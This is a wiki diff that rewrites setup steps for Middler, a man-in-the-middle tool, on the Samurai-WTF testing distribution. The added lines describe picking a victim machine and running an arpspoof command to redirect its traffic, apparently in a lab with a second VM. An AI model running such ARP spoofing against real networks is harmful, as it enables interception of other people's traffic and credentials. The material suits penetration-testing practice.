@@ -1,8 +1,15 @@
+= Getting Set Up =
  # Download the latest copy of Samurai-WTF at samurai.inguardians.com
- # Boot it up either from the live CD or from a virtual environment like VMware.
- # Install Middler's dependencies by running: <br> {{{sudo aptitude install libdumbnet-dev python-libpcap python-beautifulsoup python-scapy}}}
+ # Boot Samurai-WTF from the live CD or from a virtual environment like VMware.
+ # Install Middler's dependencies by opening a terminal and running: <br> {{{sudo aptitude install libdumbnet-dev python-libpcap python-beautifulsoup python-scapy}}}
  # Install Middler by running: <br> {{{svn checkout http://middler.googlecode.com/svn/trunk/ middler-read-only}}}
  # Install dsniff so we can spoof ARP tables on victim machines (This functionality will be included in Middler within the next few weeks): <br> {{{sudo aptitude install dsniff}}}
  # Since middler needs to listen on port 80, shut down apache: <br> {{{sudo /etc/init.d/apache2 stop}}}
- # Move into the Middler directory: <br> {{{cd middler-read-only}}}
+
+= Playing with Middler =
+ # Move into the Middler's directory: <br> {{{cd middler-read-only}}}
  # Start up Middler with: <br> {{{sudo ./middler.py}}}
+ # Choose a victim computer (or start a second VM to pick on)
+ # On the machine running Middler, start an arpspoof attack against your victim: <br> {{{arpspoof -i <interface> -t <victim_ip> <gateway_ip>}}}
+ # On the victim machine, verify the gateway's MAC address is being spoofed: <br> {{{arp -n}}}
+ # On the victim machine, open a browser and surf to www.frog.com
